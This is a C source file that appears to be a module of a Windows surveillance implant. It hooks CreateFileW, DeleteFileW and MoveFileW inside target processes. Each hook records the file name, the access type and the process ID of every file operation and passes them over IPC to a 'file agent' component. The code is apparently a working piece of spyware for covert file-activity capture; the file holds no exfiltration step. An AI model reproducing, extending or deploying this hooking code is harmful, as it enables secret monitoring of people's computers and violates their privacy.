#include <windows.h>
#include "Common.h"
#include "missing.h"
#include "Hooking.h"
#include "FileCapture.h"

// -------------------------------- CreateFileW -----------------------------------
HANDLE _stdcall H_CreateFileWHook(void *data_param,
								  WCHAR *lpFileName,
								  DWORD dwDesiredAccess,
								  DWORD dwShareMode,
								  PVOID lpSecurityAttributes,
								  DWORD dwCreationDisposition,
								  DWORD dwFlags,
								  HANDLE hTemplateFile)
{
	IPCFileStruct IPCFileData;
	DWORD i;

	INIT_WRAPPER(H_CreateFileW, HANDLE);

	CALL_ORIGINAL_API(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlags, hTemplateFile);	
	if (ret_code==INVALID_HANDLE_VALUE || !lpFileName)
		return ret_code;
	
	IF_ACTIVE_AGENT(PM_FILEAGENT) {
		for (i=0; i<MAX_PATH && lpFileName[i]; i++) 
			IPCFileData.szFileName[i] = lpFileName[i];
		IPCFileData.szFileName[i] = 0;

		IPCFileData.dwOperation = dwDesiredAccess;
		IPCFileData.dwPid = pData->pGetCurrentProcessId();
			
		IPC_CLIENT_WRITE(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCFileData), 0, IPC_DEF_PRIORITY);
	}
	return ret_code;
}

BOOL H_CreateFileW_setup(H_CreateFileWStruct *data)
{
	HMODULE hMod;
	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))
	VALIDPTR(data->pGetCurrentProcessId = (GetCurrentProcessId_t)GetProcAddress(hMod, "GetCurrentProcessId"))
	return TRUE;
}


// -------------------------------- DeleteFileW -----------------------------------
BOOL _stdcall H_DeleteFileWHook(void *data_param, 
								WCHAR *FileName)
{
	IPCFileStruct IPCFileData;
	DWORD i;
	
	INIT_WRAPPER(H_DeleteFileW, BOOL);

	CALL_ORIGINAL_API(FileName);
	if (!ret_code || !FileName)
		return ret_code;

	IF_ACTIVE_AGENT(PM_FILEAGENT) {
		for (i=0; i<MAX_PATH && FileName[i]; i++) 
			IPCFileData.szFileName[i] = FileName[i];
		IPCFileData.szFileName[i] = 0;

		IPCFileData.dwOperation = DELETE;
		IPCFileData.dwPid = pData->pGetCurrentProcessId();
			
		IPC_CLIENT_WRITE(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCFileData), 0, IPC_DEF_PRIORITY);
	}
	return ret_code;
}

BOOL H_DeleteFileW_setup(H_DeleteFileWStruct *data)
{
	HMODULE hMod;
	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))
	VALIDPTR(data->pGetCurrentProcessId = (GetCurrentProcessId_t)GetProcAddress(hMod, "GetCurrentProcessId"))
	return TRUE;
}


// -------------------------------- MoveFileW -----------------------------------
BOOL _stdcall H_MoveFileWHook(void *data_param,
							  WCHAR *SourceFile, 
							  WCHAR *DestFile)
{
	IPCFileStruct IPCFileData;
	DWORD i;

	INIT_WRAPPER(H_MoveFileW, BOOL);

	CALL_ORIGINAL_API(SourceFile, DestFile);
	if (!ret_code || !SourceFile || !DestFile)
		return ret_code;

	IF_ACTIVE_AGENT(PM_FILEAGENT) {
		// Notifica il file sorgente come cancellato
		for (i=0; i<MAX_PATH && SourceFile[i]; i++) 
			IPCFileData.szFileName[i] = SourceFile[i];
		IPCFileData.szFileName[i] = 0;

		IPCFileData.dwOperation = DELETE;
		IPCFileData.dwPid = pData->pGetCurrentProcessId();
			
		IPC_CLIENT_WRITE(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCFileData), 0, IPC_DEF_PRIORITY);

		// Notifica il file destinazione come scritto
		for (i=0; i<MAX_PATH && DestFile[i]; i++) 
			IPCFileData.szFileName[i] = DestFile[i];
		IPCFileData.szFileName[i] = 0;

		IPCFileData.dwOperation = GENERIC_WRITE;
		IPCFileData.dwPid = pData->pGetCurrentProcessId();
			
		IPC_CLIENT_WRITE(PM_FILEAGENT, (BYTE *)&IPCFileData, sizeof(IPCFileData), 0, IPC_DEF_PRIORITY);
	}

	return ret_code;
}

BOOL H_MoveFileW_setup(H_MoveFileWStruct *data)
{
	HMODULE hMod;
	VALIDPTR(hMod = GetModuleHandle("KERNEL32.DLL"))
	VALIDPTR(data->pGetCurrentProcessId = (GetCurrentProcessId_t)GetProcAddress(hMod, "GetCurrentProcessId"))
	return TRUE;
}


